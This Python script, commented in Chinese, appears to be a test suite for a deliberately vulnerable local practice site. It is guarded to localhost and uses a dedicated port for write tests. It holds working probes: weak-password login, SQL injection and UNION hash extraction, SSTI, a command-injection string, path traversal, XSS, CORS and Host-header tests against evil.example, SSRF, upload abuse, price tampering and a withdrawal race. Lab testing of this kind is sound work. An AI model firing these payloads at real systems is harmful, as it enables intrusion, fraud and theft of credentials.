"""靶场专用攻击套件（允许写操作 —— 仅限 target-site-lab！）

覆盖只读阶段无法验证的类：垂直越权 / SSTI / 命令注入 / 路径穿越 / 存储型XSS /
SSRF / 文件上传 / 金额篡改 / 负数 / 优惠券重复 / 并发竞态 / 状态机绕过 / 信息泄露 / 弱口令。

安全边界（硬编码）：
  · 目标必须过 guard（只允许 localhost/内网）
  · 仅当目标端口 == 8095（靶场专用端口）时才允许写操作，其它端口自动降级为只读
  · 所有写操作都发生在靶场内，靶场可一键重置

用法: python lab_attack.py [http://127.0.0.1:8095]
"""
import http.cookiejar
import json
import re
import sys
import threading
import urllib.error
import urllib.parse
import urllib.request

from guard import assert_target_allowed

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:  # noqa: BLE001
    pass

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8095").rstrip("/")
assert_target_allowed(BASE)
PORT = urllib.parse.urlparse(BASE).port
WRITE_OK = (PORT == 8095)          # 只有靶场端口允许写操作
UA = "DSH-LabAttack/0.1 (lab-only)"
RESULTS = []


class Client:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.jar))

    def req(self, path, data=None, method=None, headers=None, timeout=15):
        url = BASE + path
        assert_target_allowed(url)
        body = None
        h = {"User-Agent": UA}
        if isinstance(data, dict):
            body = urllib.parse.urlencode(data).encode()
            h["Content-Type"] = "application/x-www-form-urlencoded"
        elif isinstance(data, bytes):
            body = data
        h.update(headers or {})
        r = urllib.request.Request(url, data=body, headers=h, method=method)
        try:
            with self.op.open(r, timeout=timeout) as resp:
                return resp.status, resp.read(200_000).decode("utf-8", "replace"), dict(resp.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read(200_000).decode("utf-8", "replace"), dict(e.headers or {})
        except Exception as e:  # noqa: BLE001
            return None, str(e), {}


C = Client()


def add(vid, cat, name, found, evidence, note=""):
    RESULTS.append({"id": vid, "cat": cat, "name": name,
                    "hit": bool(found), "evidence": evidence[:220], "note": note})
    print(f"  {'🎯 命中' if found else '·  未见'} [{vid}] {name} —— {evidence[:110]}")


def csrf_of(html):
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', html or "")
    return m.group(1) if m else None


def form(path, fields, headers=None):
    s, b, h = C.req(path)
    tok = csrf_of(b)
    if tok:
        fields = {"csrf_token": tok, **fields}
    return C.req(path, fields, headers=headers)


print(f"=== 靶场攻击套件 {BASE} ===  (写操作{'已启用' if WRITE_OK else '未启用-只读降级'})\n")

# ---------- 认证 / 弱口令 ----------
print("[A] 认证与会话")
s, b, _ = form("/login", {"username": "admin", "password": "admin123"})
sp, bp, _ = C.req("/profile")
add("A1", "认证", "弱口令 admin/admin123 可登录",
    ("admin" in bp and "登录" not in bp[:150]) or (sp == 200 and "退出" in bp),
    f"login HTTP {s}; /profile HTTP {sp}")
s, b, _ = C.req("/login")
tok = csrf_of(b)
if tok:
    C.req("/login", {"username": "admin", "password": "admin123"})   # 建立会话
s, b, _ = C.req("/profile")
tok2 = csrf_of(b)
if tok2 and WRITE_OK:
    s2, b2, _ = C.req("/profile/password", {"csrf_token": "", "new_password": "x"})
    add("A2", "认证", "改密无 CSRF token 校验", s2 in (200, 302) and "csrf" not in b2.lower(),
        f"不带 token 改密 → HTTP {s2}")

# ---------- 授权 ----------
print("\n[B] 授权")
s, b, _ = C.req("/api/order?id=1")
other = bool(re.search(r'"user_id"\s*:\s*([2-9])', b or ""))
add("B1", "越权", "水平越权：读他人订单", s == 200 and other, f"HTTP {s} {b[:80]}")
s, b, _ = C.req("/api/profile?id=1")
priv = ("phone" in (b or "")) or ("balance" in (b or ""))
add("B2", "越权", "水平越权：读他人隐私字段", s == 200 and priv, f"HTTP {s} {b[:80]}")
s, b, _ = C.req("/admin/users")
add("B3", "越权", "垂直越权：普通用户访问 /admin", s == 200 and ("user" in (b or "").lower()),
    f"HTTP {s} {b[:80]}")

# ---------- 注入 ----------
print("\n[C] 注入")
C2 = Client()
s, b, _ = C2.req("/login")
tok = csrf_of(b)
C2.req("/login", {"csrf_token": tok, "username": "x' OR '1'='1' -- ", "password": "x"})
sp, bp, _ = C2.req("/profile")
add("C1", "注入", "登录 SQL 注入绕过", sp == 200 and "退出" in bp, f"/profile HTTP {sp}")
s, b, _ = C.req("/api/search?q=" + urllib.parse.quote("' UNION SELECT 1,username,password_hash,4 FROM users-- "))
add("C2", "注入", "查询接口 SQL 注入(UNION)", s == 200 and re.search(r"[0-9a-f]{64}", b or "") is not None,
    f"HTTP {s} {b[:80]}")
s, b, _ = C.req("/greet?name=" + urllib.parse.quote("{{7*7}}"))
add("C3", "注入", "SSTI 模板注入", "49" in (b or ""), f"HTTP {s} {b[:80]}")
s, b, _ = C.req("/ping?host=" + urllib.parse.quote("127.0.0.1; echo DSH_RCE_MARK"))
add("C4", "注入", "命令注入", "DSH_RCE_MARK" in (b or ""), f"HTTP {s} {b[:80]}")
s, b, _ = C.req("/download?file=" + urllib.parse.quote("../app.py"))
add("C5", "注入", "路径穿越读源码", s == 200 and ("import " in (b or "") or "def " in (b or "")),
    f"HTTP {s} {b[:60]}")

# ---------- XSS ----------
print("\n[D] XSS")
mark = "dshxss<i>x</i>"
s, b, _ = C.req("/search?q=" + urllib.parse.quote(mark))
add("D1", "XSS", "反射型 XSS（未转义）", mark in (b or ""), f"HTTP {s}")
if WRITE_OK:
    form("/board", {"content": mark})
    s, b, _ = C.req("/board")
    add("D2", "XSS", "存储型 XSS（未转义）", mark in (b or ""), f"HTTP {s}")

# ---------- 跨域 / Host ----------
print("\n[E] 跨域")
s, b, h = C.req("/", headers={"Origin": "https://evil.example"})
acao = next((v for k, v in h.items() if k.lower() == "access-control-allow-origin"), None)
acac = next((v for k, v in h.items() if k.lower() == "access-control-allow-credentials"), None)
add("E1", "CORS", "CORS 反射任意 Origin + 凭据", acao == "https://evil.example" and str(acac).lower() == "true",
    f"ACAO={acao} ACAC={acac}")
s, b, _ = C.req("/reset-password", headers={"X-Forwarded-Host": "evil.example"})
add("E2", "Host注入", "Host 头注入（重置链接）", "evil.example" in (b or ""), f"HTTP {s}")

# ---------- 服务端 ----------
print("\n[F] 服务端")
s, b, _ = C.req("/fetch?url=" + urllib.parse.quote(BASE + "/"))
add("F1", "SSRF", "SSRF 拉取内部 URL 回显", s == 200 and ("<html" in (b or "").lower() or "body" in (b or "").lower()),
    f"HTTP {s}")
if WRITE_OK:
    boundary = "----dshlab"
    payload = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"dsh_upload.txt\"\r\n"
               f"Content-Type: text/plain\r\n\r\nDSH_UPLOAD_MARK\r\n--{boundary}--\r\n").encode()
    s, b, _ = C.req("/upload", payload, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    s2, b2, _ = C.req("/uploads/dsh_upload.txt")
    add("F2", "上传", "无校验文件上传 + 可直接访问", "DSH_UPLOAD_MARK" in (b2 or ""),
        f"upload HTTP {s}; 访问 HTTP {s2}")

# ---------- 业务逻辑（写操作）----------
print("\n[G] 业务逻辑（写操作，靶场专用）")
if WRITE_OK:
    s, b, _ = C.req("/order/create", {"item": "x", "price": "1", "qty": "1"})
    add("G1", "逻辑", "金额篡改（客户端传 price）", s in (200, 302) and ("1" in (b or "") or s == 302),
        f"HTTP {s} {b[:80]}")
    s, b, _ = C.req("/order/create", {"item": "x", "price": "100", "qty": "-5"})
    add("G2", "逻辑", "负数数量", s in (200, 302), f"HTTP {s} {b[:80]}")
    s1, _, _ = C.req("/coupon/claim", {})
    s2, _, _ = C.req("/coupon/claim", {})
    add("G3", "逻辑", "优惠券重复领取", s1 in (200, 302) and s2 in (200, 302),
        f"两次领取 HTTP {s1}/{s2}")
    # 并发竞态：多线程同时提现
    codes = []
    lock = threading.Lock()

    def w():
        c = Client()
        c.req("/login", {"username": "admin", "password": "admin123"})
        st, _, _ = c.req("/wallet/withdraw", {"amount": "200"})
        with lock:
            codes.append(st)

    ts = [threading.Thread(target=w) for _ in range(6)]
    [t.start() for t in ts]
    [t.join() for t in ts]
    s, b, _ = C.req("/wallet")
    neg = bool(re.search(r'-\d', b or ""))
    add("G4", "逻辑", "并发竞态（TOCTOU）导致余额异常", neg or len([c for c in codes if c in (200, 302)]) > 1,
        f"6 并发提现返回 {codes}; 余额响应 {b[:70]}")
    s, b, _ = C.req("/order/status?state=shipped", {})
    add("G5", "逻辑", "状态机绕过（跳过支付直接发货）", s in (200, 302) and "ship" in (b or "").lower(),
        f"HTTP {s} {b[:80]}")

# ---------- 信息泄露 ----------
print("\n[H] 信息泄露")
for vid, path, key, name in [
    ("H1", "/api/search?q=" + urllib.parse.quote("'"), "Traceback", "错误页回显 traceback"),
    ("H2", "/debug", "sqlite", "/debug 泄露配置"),
    ("H3", "/backup/config.bak", "=", "备份文件可下载"),
]:
    s, b, _ = C.req(path)
    add(vid, "信息泄露", name, s == 200 and (key in (b or "") or len(b or "") > 40),
        f"HTTP {s} {b[:70]}")

print("\n=== 汇总 ===")
hits = [r for r in RESULTS if r["hit"]]
print(f"  检查 {len(RESULTS)} 项，命中 {len(hits)} 项")
for r in hits:
    print(f"  🎯 [{r['id']}] {r['name']}")
out = "lab_findings.json"
with open(out, "w", encoding="utf-8") as f:
    json.dump(RESULTS, f, ensure_ascii=False, indent=1)
print(f"  结果已存: {out}（下一步用 lab_score.py 与 LAB-MANIFEST.md 对照算命中率）")
